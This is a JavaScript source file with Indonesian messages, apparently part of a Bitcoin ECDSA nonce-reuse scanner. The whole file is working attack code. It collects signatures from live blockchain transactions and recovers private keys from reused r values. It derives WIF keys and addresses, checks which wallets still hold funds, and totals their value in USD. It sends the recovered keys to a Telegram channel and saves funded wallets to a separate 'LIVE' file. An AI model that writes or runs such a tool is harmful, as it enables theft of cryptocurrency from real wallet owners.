import { appendFileSync } from "node:fs";
import { CONFIG, DEFAULT_API } from "./config.js";
import { logScan } from "./log.js";
import { hexToBytes, bytesToHex, bytesToBigInt, padHex, concat } from "./bytes.js";
import { secp256k1, hash160 } from "./hash.js";
import { sep, box, c, C, ICON } from "./ui.js";
import { parseDER, parseScriptPushes, parseTx } from "./tx.js";
import { legacySighash, bip143Sighash } from "./sighash.js";
import { p2pkhAddress, p2wpkhAddress, p2shP2wpkhAddress, toWIF } from "./address.js";
import { recoverPrivateKey } from "./ecdsa.js";
import { esploraFetch, sleep } from "./net.js";
import { fetchTxHexCached } from "./cache.js";
import { fetchAddressBalance, formatBTC, fetchBtcUsdPrice, formatUSD } from "./price.js";
import { notifyTelegram } from "./telegram.js";

export async function fetchAllTxsForAddress(base, address) {
  const all = [];
  const seen = new Set();
  let lastSeen = null;
  let page = 0;
  while (true) {
    page++;
    const path = lastSeen
      ? "/address/" + address + "/txs/chain/" + lastSeen
      : "/address/" + address + "/txs";
    let data;
    try {
      data = await esploraFetch(base, path);
    } catch (e) {
      process.stdout.write("\n");
      console.log(c(C.yellow, "  ! Pagination berhenti di halaman " + page +
        " (" + e.message + "). Lanjut dengan " + all.length + " tx yang sudah didapat."));
      logScan("WARN", "pagination[" + address + "] berhenti di halaman " + page + " sisa belum dimuat · " + e.message);
      break;
    }
    if (!Array.isArray(data) || data.length === 0) break;
    let added = 0;
    for (const tx of data) {
      if (tx && tx.txid && !seen.has(tx.txid)) {
        seen.add(tx.txid);
        all.push(tx);
        added++;
      }
    }
    process.stdout.write("\r" + c(C.dim, "  paginasi: " + all.length + " tx dimuat (halaman " + page + ")") + "\x1b[K");
    if (added === 0) break;
    if (lastSeen && data.length < 25) break;
    lastSeen = data[data.length - 1].txid;
    await sleep(120);
  }
  process.stdout.write("\n");
  return all;
}

export async function processTxForAddress(tx, address, base) {
  const ourInputs = [];
  for (let i = 0; i < tx.vin.length; i++) {
    if (tx.vin[i].prevout && tx.vin[i].prevout.scriptpubkey_address === address) ourInputs.push(i);
  }
  if (ourInputs.length === 0) return { sigs: [], err: null };
  let hex;
  try { hex = await fetchTxHexCached(base, tx.txid); }
  catch (e) { return { sigs: [], err: "ambil " + tx.txid + ": " + e.message }; }
  let parsed;
  try { parsed = parseTx(hexToBytes(hex.trim())); }
  catch (e) { return { sigs: [], err: "parse " + tx.txid + ": " + e.message }; }
  const out = [];
  for (const i of ourInputs) {
    const vi = parsed.vin[i];
    let pushes = parseScriptPushes(vi.scriptSig);
    let isWitness = false;
    if (pushes.length < 2 && vi.witness.length >= 2) { pushes = vi.witness; isWitness = true; }
    if (pushes.length < 2) continue;
    let der;
    try { der = parseDER(pushes[0]); } catch { continue; }
    const pubBytes = pushes[1];
    const pubHash = hash160(pubBytes);
    const sht = der.sighashType == null ? 1 : der.sighashType;
    let z = null;
    try {
      const scriptCode = concat(new Uint8Array([0x76, 0xa9, 0x14]), pubHash, new Uint8Array([0x88, 0xac]));
      if (isWitness) {
        const amt = tx.vin[i].prevout && tx.vin[i].prevout.value;
        if (amt === undefined) continue;
        z = bytesToBigInt(bip143Sighash(parsed, i, scriptCode, amt, sht));
      } else {
        z = bytesToBigInt(legacySighash(parsed, i, scriptCode, sht));
      }
    } catch { continue; }
    out.push({
      txid: tx.txid, inputIndex: i,
      r: der.r, s: der.s, z,
      pubkey: bytesToHex(pubBytes),
      pubkeyHash: bytesToHex(pubHash),
      address,
    });
  }
  return { sigs: out, err: null };
}

export async function processTxAllInputs(tx, base) {
  let hex;
  try { hex = await fetchTxHexCached(base, tx.txid); }
  catch (e) { return { sigs: [], err: "ambil " + tx.txid + ": " + e.message }; }
  let parsed;
  try { parsed = parseTx(hexToBytes(hex.trim())); }
  catch (e) { return { sigs: [], err: "parse " + tx.txid + ": " + e.message }; }
  const out = [];
  for (let i = 0; i < parsed.vin.length; i++) {
    const vi = parsed.vin[i];
    let pushes = parseScriptPushes(vi.scriptSig);
    let isWitness = false;
    if (pushes.length < 2 && vi.witness.length >= 2) { pushes = vi.witness; isWitness = true; }
    if (pushes.length < 2) continue;
    let der;
    try { der = parseDER(pushes[0]); } catch { continue; }
    const pubBytes = pushes[1];
    const pubHash = hash160(pubBytes);
    const address = p2pkhAddress(pubHash);
    const sht = der.sighashType == null ? 1 : der.sighashType;
    let z = null;
    try {
      const scriptCode = concat(new Uint8Array([0x76, 0xa9, 0x14]), pubHash, new Uint8Array([0x88, 0xac]));
      if (isWitness) {
        const amt = tx.vin && tx.vin[i] && tx.vin[i].prevout && tx.vin[i].prevout.value;
        if (amt == null) continue;
        z = bytesToBigInt(bip143Sighash(parsed, i, scriptCode, amt, sht));
      } else {
        z = bytesToBigInt(legacySighash(parsed, i, scriptCode, sht));
      }
    } catch { continue; }
    out.push({
      txid: tx.txid, inputIndex: i,
      r: der.r, s: der.s, z,
      pubkey: bytesToHex(pubBytes),
      pubkeyHash: bytesToHex(pubHash),
      address,
    });
  }
  return { sigs: out, err: null };
}

export async function runWithConcurrency(items, limit, worker, onProgress) {
  const results = new Array(items.length);
  let next = 0;
  let done = 0;
  async function spawn() {
    while (true) {
      const i = next++;
      if (i >= items.length) return;
      try {
        results[i] = await worker(items[i], i);
      } catch (e) {
        results[i] = { sigs: [], err: "worker: " + (e && e.message ? e.message : String(e)) };
      }
      done++;
      try { if (onProgress) onProgress(done, items[i]); } catch {}
    }
  }
  const workers = Array.from({ length: Math.min(limit, items.length) }, spawn);
  await Promise.all(workers);
  return results;
}

export async function detectReuse(sigs, opts = {}) {
  sep(opts.crossAddressOnly ? "Deteksi R-reuse LINTAS ADDRESS" : "Deteksi R-reuse");
  const hitsFile = opts.hitsFile || "hits.txt";
  const groups = new Map();
  for (const s of sigs) {
    const key = padHex(s.r);
    if (!groups.has(key)) groups.set(key, []);
    groups.get(key).push(s);
  }
  let found = false;
  let hitCount = 0;
  const recovered = [];
  for (const [r, list] of groups) {
    if (list.length < 2) continue;
    if (opts.crossAddressOnly) {
      const addrs = new Set(list.map((s) => s.address).filter(Boolean));
      if (addrs.size < 2) continue;
    }
    found = true;
    console.log(c(C.red, `\n!! R berulang ditemukan pada R = ${r}`));
    console.log("   Tanda tangan terkait:");
    for (const s of list) {
      console.log(
        `   - input #${s.index}  tx ${s.txid ? s.txid.slice(0, 16) + "…" : "(manual)"}  pubkey ${s.pubkey.slice(0, 16)}…`
      );
    }
    const seenPriv = new Set();
    for (let i = 0; i < list.length; i++) {
      for (let j = i + 1; j < list.length; j++) {
        const a = list[i], b = list[j];
        if (a.z === null || b.z === null) {
          console.log(c(C.yellow, "   (lewati: Z belum diketahui, sediakan --amount untuk segwit)"));
          continue;
        }
        const cands = recoverPrivateKey(a.r, a.s, a.z, b.s, b.z);
        for (const { k, d } of cands) {
          try {
            const dHex = padHex(d);
            if (seenPriv.has(dHex)) continue;
            const pubCompressed = secp256k1.getPublicKey(hexToBytes(dHex), true);
            const pubUncompressed = secp256k1.getPublicKey(hexToBytes(dHex), false);
            const pubCHex = bytesToHex(pubCompressed);
            const pubUHex = bytesToHex(pubUncompressed);
            if (pubCHex === a.pubkey || pubUHex === a.pubkey ||
                pubCHex === b.pubkey || pubUHex === b.pubkey) {
              seenPriv.add(dHex);
              hitCount++;
              const matchedPub = (pubCHex === a.pubkey || pubCHex === b.pubkey) ? pubCHex : pubUHex;
              const h160C = hash160(pubCompressed);
              const addrCompressed = p2pkhAddress(h160C);
              const addrUncompressed = p2pkhAddress(hash160(pubUncompressed));
              const addrSegwit = p2wpkhAddress(h160C);
              const addrP2sh = p2shP2wpkhAddress(h160C);
              const wifC = toWIF(d, 0x80, true);
              const wifU = toWIF(d, 0x80, false);
              console.log();
              box(ICON.key + "  PRIVATE KEY DIPULIHKAN", [
                c(C.dim, "Nonce k       ") + " " + c(C.magenta, padHex(k)),
                c(C.dim, "Priv (hex)    ") + " " + c(C.green + C.bold, dHex),
                c(C.dim, "WIF compressed") + " " + c(C.green, wifC),
                c(C.dim, "WIF uncompres ") + " " + c(C.green, wifU),
                c(C.dim, "Pubkey match  ") + " " + matchedPub,
                c(C.dim, "Addr P2PKH c  ") + " " + c(C.green + C.bold, addrCompressed),
                c(C.dim, "Addr P2PKH u  ") + " " + c(C.green + C.bold, addrUncompressed),
                c(C.dim, "Addr P2WPKH   ") + " " + c(C.green + C.bold, addrSegwit),
                c(C.dim, "Addr P2SH-WPKH") + " " + c(C.green + C.bold, addrP2sh),
              ], C.green);
              logScan("HIT", "private-key dipulihkan scanned=" + (opts.scannedAddress || "-") +
                " priv=" + dHex + " p2pkhC=" + addrCompressed + " p2wpkh=" + addrSegwit);

              recovered.push({
                ts: new Date().toISOString(),
                scannedAddress: opts.scannedAddress || null,
                privHex: dHex,
                wifCompressed: wifC,
                wifUncompressed: wifU,
                pubkey: matchedPub,
                addressCompressed: addrCompressed,
                addressUncompressed: addrUncompressed,
                addressSegwit: addrSegwit,
                addressP2sh: addrP2sh,
                r: padHex(a.r),
                txids: [a.txid, b.txid].filter(Boolean),
                inputs: [a.index, b.index],
              });
            }
          } catch {}
        }
      }
    }
  }
  if (!found) {
    console.log(c(C.green, "Tidak ada R-reuse terdeteksi."));
    return [];
  }

  if (recovered.length && opts.checkBalance !== false) {
    const base = opts.api || DEFAULT_API;
    console.log();
    sep("Pengecekan Saldo (" + (recovered.length * 4) + " address di " + base + ")");
    const fmtBalance = (b, label) => {
      if (b.balanceSat == null) return c(C.red, ICON.err + " error " + label);
      const live = b.balanceSat > 0;
      const head = live
        ? ICON.money + " " + c(C.green + C.bold, formatBTC(b.balanceSat))
        : c(C.dim, "  0.00000000 BTC");
      return head + c(C.gray, "   " + label + " · diterima " + formatBTC(b.totalReceivedSat) + " · " + b.txCount + " tx");
    };
    for (const h of recovered) {
      const [bC, bU, bS, bP] = await Promise.all([
        fetchAddressBalance(base, h.addressCompressed),
        fetchAddressBalance(base, h.addressUncompressed),
        fetchAddressBalance(base, h.addressSegwit),
        fetchAddressBalance(base, h.addressP2sh),
      ]);
      h.balanceCompressed = bC;
      h.balanceUncompressed = bU;
      h.balanceSegwit = bS;
      h.balanceP2sh = bP;
      const live =
        (bC.balanceSat && bC.balanceSat > 0) ||
        (bU.balanceSat && bU.balanceSat > 0) ||
        (bS.balanceSat && bS.balanceSat > 0) ||
        (bP.balanceSat && bP.balanceSat > 0);
      const tag = live ? "  " + ICON.alert + c(C.red + C.bold, " WALLET HIDUP") : "";
      console.log(c(live ? C.green + C.bold : C.dim, "\n  " + h.addressCompressed) + tag);
      console.log("    " + fmtBalance(bC, "P2PKH compressed"));
      console.log(c(live ? C.green + C.bold : C.dim, "  " + h.addressUncompressed));
      console.log("    " + fmtBalance(bU, "P2PKH uncompressed"));
      console.log(c(live ? C.green + C.bold : C.dim, "  " + h.addressSegwit));
      console.log("    " + fmtBalance(bS, "P2WPKH (bech32)"));
      console.log(c(live ? C.green + C.bold : C.dim, "  " + h.addressP2sh));
      console.log("    " + fmtBalance(bP, "P2SH-P2WPKH (3...)"));
    }

    if (CONFIG.telegram.enabled) {
      const onlyLive = CONFIG.telegram.notifyOnLiveOnly !== false;
      const targets = onlyLive
        ? recovered.filter((h) =>
            (h.balanceCompressed && h.balanceCompressed.balanceSat > 0) ||
            (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0) ||
            (h.balanceSegwit && h.balanceSegwit.balanceSat > 0) ||
            (h.balanceP2sh && h.balanceP2sh.balanceSat > 0))
        : recovered;
      for (const h of targets) {
        const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
        const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
        const liveS = h.balanceSegwit && h.balanceSegwit.balanceSat > 0;
        const liveP = h.balanceP2sh && h.balanceP2sh.balanceSat > 0;
        const tag = (liveC || liveU || liveS || liveP) ? "🚨 *WALLET HIDUP DITEMUKAN*" : "🔑 *Private key dipulihkan*";
        const lines = [
          tag,
          h.scannedAddress ? "Scan: `" + h.scannedAddress + "`" : null,
          "Priv (hex): `" + h.privHex + "`",
          "WIF (comp): `" + h.wifCompressed + "`",
          "P2PKH comp : `" + h.addressCompressed + "`" +
            (liveC ? " — *" + formatBTC(h.balanceCompressed.balanceSat) + "*" : ""),
          "P2PKH uncmp: `" + h.addressUncompressed + "`" +
            (liveU ? " — *" + formatBTC(h.balanceUncompressed.balanceSat) + "*" : ""),
          "P2WPKH bc1 : `" + h.addressSegwit + "`" +
            (liveS ? " — *" + formatBTC(h.balanceSegwit.balanceSat) + "*" : ""),
          "P2SH-P2WPKH: `" + h.addressP2sh + "`" +
            (liveP ? " — *" + formatBTC(h.balanceP2sh.balanceSat) + "*" : ""),
          "TXID: " + (h.txids || []).slice(0, 4).map((t) => "`" + t.slice(0, 16) + "…`").join(", "),
        ].filter(Boolean);
        await notifyTelegram(lines.join("\n"));
      }
    }
  }

  if (recovered.length && opts.saveHits !== false) {
    try {
      const lines = [];
      for (const h of recovered) {
        const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
        const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
        const liveS = h.balanceSegwit && h.balanceSegwit.balanceSat > 0;
        const liveP = h.balanceP2sh && h.balanceP2sh.balanceSat > 0;
        const banner = (liveC || liveU || liveS || liveP) ? "  *** WALLET MASIH ADA SALDO ***" : "";
        lines.push("==========================================================" + banner);
        lines.push("Waktu              : " + h.ts);
        if (h.scannedAddress) lines.push("Address yang di-scan: " + h.scannedAddress);
        lines.push("Private key (hex)  : " + h.privHex);
        lines.push("WIF (compressed)   : " + h.wifCompressed);
        lines.push("WIF (uncompressed) : " + h.wifUncompressed);
        lines.push("Public key         : " + h.pubkey);
        lines.push("Address P2PKH comp : " + h.addressCompressed);
        if (h.balanceCompressed) {
          lines.push("  Saldo            : " + formatBTC(h.balanceCompressed.balanceSat));
          lines.push("  Total diterima   : " + formatBTC(h.balanceCompressed.totalReceivedSat));
          lines.push("  Jumlah tx        : " + h.balanceCompressed.txCount);
        }
        lines.push("Address P2PKH uncm : " + h.addressUncompressed);
        if (h.balanceUncompressed) {
          lines.push("  Saldo            : " + formatBTC(h.balanceUncompressed.balanceSat));
          lines.push("  Total diterima   : " + formatBTC(h.balanceUncompressed.totalReceivedSat));
          lines.push("  Jumlah tx        : " + h.balanceUncompressed.txCount);
        }
        lines.push("Address P2WPKH bc1 : " + h.addressSegwit);
        if (h.balanceSegwit) {
          lines.push("  Saldo            : " + formatBTC(h.balanceSegwit.balanceSat));
          lines.push("  Total diterima   : " + formatBTC(h.balanceSegwit.totalReceivedSat));
          lines.push("  Jumlah tx        : " + h.balanceSegwit.txCount);
        }
        lines.push("Address P2SH-WPKH  : " + h.addressP2sh);
        if (h.balanceP2sh) {
          lines.push("  Saldo            : " + formatBTC(h.balanceP2sh.balanceSat));
          lines.push("  Total diterima   : " + formatBTC(h.balanceP2sh.totalReceivedSat));
          lines.push("  Jumlah tx        : " + h.balanceP2sh.txCount);
        }
        lines.push("R reuse value      : " + h.r);
        lines.push("TXID terkait       : " + h.txids.join(", "));
        lines.push("");
      }
      appendFileSync(hitsFile, lines.join("\n"));
      const jsonFile = hitsFile.replace(/\.txt$/, "") + ".jsonl";
      appendFileSync(jsonFile, recovered.map((h) => JSON.stringify(h)).join("\n") + "\n");
      console.log(c(C.green + C.bold, "\n>> " + recovered.length + " hit disimpan ke: " + hitsFile + " (dan " + jsonFile + ")"));

      const live = recovered.filter((h) =>
        (h.balanceCompressed && h.balanceCompressed.balanceSat > 0) ||
        (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0) ||
        (h.balanceSegwit && h.balanceSegwit.balanceSat > 0) ||
        (h.balanceP2sh && h.balanceP2sh.balanceSat > 0));
      if (live.length) {
        const liveFile = hitsFile.replace(/\.txt$/, "") + "_LIVE.txt";
        const liveLines = [];
        for (const h of live) {
          liveLines.push("==========================================================  *** WALLET MASIH ADA SALDO ***");
          liveLines.push("Waktu              : " + h.ts);
          if (h.scannedAddress) liveLines.push("Address yang di-scan: " + h.scannedAddress);
          liveLines.push("Private key (hex)  : " + h.privHex);
          liveLines.push("WIF (compressed)   : " + h.wifCompressed);
          liveLines.push("WIF (uncompressed) : " + h.wifUncompressed);
          liveLines.push("Public key         : " + h.pubkey);
          liveLines.push("Address P2PKH comp : " + h.addressCompressed);
          if (h.balanceCompressed) {
            liveLines.push("  Saldo            : " + formatBTC(h.balanceCompressed.balanceSat));
            liveLines.push("  Total diterima   : " + formatBTC(h.balanceCompressed.totalReceivedSat));
            liveLines.push("  Jumlah tx        : " + h.balanceCompressed.txCount);
          }
          liveLines.push("Address P2PKH uncm : " + h.addressUncompressed);
          if (h.balanceUncompressed) {
            liveLines.push("  Saldo            : " + formatBTC(h.balanceUncompressed.balanceSat));
            liveLines.push("  Total diterima   : " + formatBTC(h.balanceUncompressed.totalReceivedSat));
            liveLines.push("  Jumlah tx        : " + h.balanceUncompressed.txCount);
          }
          liveLines.push("Address P2WPKH bc1 : " + h.addressSegwit);
          if (h.balanceSegwit) {
            liveLines.push("  Saldo            : " + formatBTC(h.balanceSegwit.balanceSat));
            liveLines.push("  Total diterima   : " + formatBTC(h.balanceSegwit.totalReceivedSat));
            liveLines.push("  Jumlah tx        : " + h.balanceSegwit.txCount);
          }
          liveLines.push("Address P2SH-WPKH  : " + h.addressP2sh);
          if (h.balanceP2sh) {
            liveLines.push("  Saldo            : " + formatBTC(h.balanceP2sh.balanceSat));
            liveLines.push("  Total diterima   : " + formatBTC(h.balanceP2sh.totalReceivedSat));
            liveLines.push("  Jumlah tx        : " + h.balanceP2sh.txCount);
          }
          liveLines.push("R reuse value      : " + h.r);
          liveLines.push("TXID terkait       : " + h.txids.join(", "));
          liveLines.push("");
        }
        appendFileSync(liveFile, liveLines.join("\n"));
        console.log(c(C.green + C.bold, ">> " + live.length + " wallet HIDUP juga disalin ke: " + liveFile));
      }
    } catch (e) {
      console.log(c(C.red, "Gagal menulis hits file: " + e.message));
    }
  }

  if (recovered.length && opts.checkBalance !== false) {
    let totalSat = 0n;
    let liveWallets = 0;
    for (const h of recovered) {
      const slots = [h.balanceCompressed, h.balanceUncompressed, h.balanceSegwit, h.balanceP2sh];
      let perKey = 0n;
      for (const b of slots) {
        if (b && b.balanceSat && b.balanceSat > 0) perKey += BigInt(b.balanceSat);
      }
      if (perKey > 0n) liveWallets++;
      totalSat += perKey;
    }
    const totalBtc = Number(totalSat) / 1e8;
    const usd = await fetchBtcUsdPrice();
    const usdVal = usd ? totalBtc * usd : null;
    console.log();
    box(ICON.money + "  RINGKASAN TOTAL", [
      c(C.dim, "Kunci dipulihkan ") + " " + c(C.bold, String(recovered.length)),
      c(C.dim, "Wallet hidup     ") + " " + c(liveWallets > 0 ? C.green + C.bold : C.dim, String(liveWallets)),
      c(C.dim, "Total saldo (BTC)") + " " +
        (totalSat > 0n ? c(C.green + C.bold, formatBTC(Number(totalSat))) : c(C.dim, "0.00000000 BTC")),
      c(C.dim, "Harga BTC/USD    ") + " " + (usd ? c(C.cyan, formatUSD(usd)) : c(C.yellow, "tidak tersedia")),
      c(C.dim, "Nilai total (USD)") + " " +
        (usdVal != null ? c(C.green + C.bold, formatUSD(usdVal)) : c(C.dim, "—")),
    ], totalSat > 0n ? C.green : C.gray);
  }

  return recovered;
}
